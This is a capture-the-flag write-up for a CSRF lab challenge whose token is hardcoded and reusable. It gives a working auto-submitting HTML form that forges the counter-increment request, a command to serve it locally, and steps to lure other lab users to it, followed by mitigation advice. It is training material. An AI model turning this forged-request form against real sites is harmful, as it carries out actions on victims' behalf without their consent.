# Cross Site Request Forgery Challenge Four

## Description
`POST /user/csrfchallengefour/plusplus`
With the following parameters: `userId=your_user_id & csrfToken=your_csrf_token`

Where your_user_id is the ID of the user whose CSRF counter is being incremented. Your ID is: `3297ff70ad130c5b6858593e2087452b0d2afe71` and your CSRF token is `-134150720005587006596802696776920856524`. Any user other than you may increment your counter for this challenge.

## Solution
This challenge is similar to the previous one, demonstrating the same flawed CSRF protection mechanism with a hardcoded token that can be reused.

## Steps to Reproduce

### 1 Step
Fill in your HTML file with the necessary information:
- userid: `3297ff70ad130c5b6858593e2087452b0d2afe71`
- csrfToken: `-134150720005587006596802696776920856524`
- domain-name: where Shepherd is running (in this example, localhost)

```html
<form name="malForm" action="https://localhost/user/csrfchallengefour/plusplus" method="POST">
    <input type="hidden" name="userId" value="3297ff70ad130c5b6858593e2087452b0d2afe71" />
    <input type="hidden" name="csrfToken" value="-134150720005587006596802696776920856524"/>
    <input type="submit"/>
</form>
<script> document.malForm.submit(); </script>
```

### 2 Step
Serve your file using a simple HTTP server:

```bash
python3 -m http.server 8080
```

### 3 Step
Post the URL to the forum. If your local server is running on port 8080, the URL would look like: `http://localhost:8080/sahinyes.html`

![](/writeups/assets/images/csrf/csrf-2-post-message.jpg)

## Exploit
When another user visits your page, the form will automatically submit with your hardcoded CSRF token, successfully bypassing the flawed protection mechanism.

## Impact
This vulnerability allows attackers to perform unauthorized actions on behalf of other users, despite the presence of what appears to be CSRF protection.

## Mitigation
To properly implement CSRF protection:
- Generate unique, random CSRF tokens for each user session
- Validate CSRF tokens on the server side for all sensitive operations
- Tie CSRF tokens to specific user sessions and forms
- Use the SameSite cookie attribute as an additional defense layer
- Implement proper token expiration mechanisms

---

[← Previous](./csrf-3.md) | [Next →](./csrf-5.md)

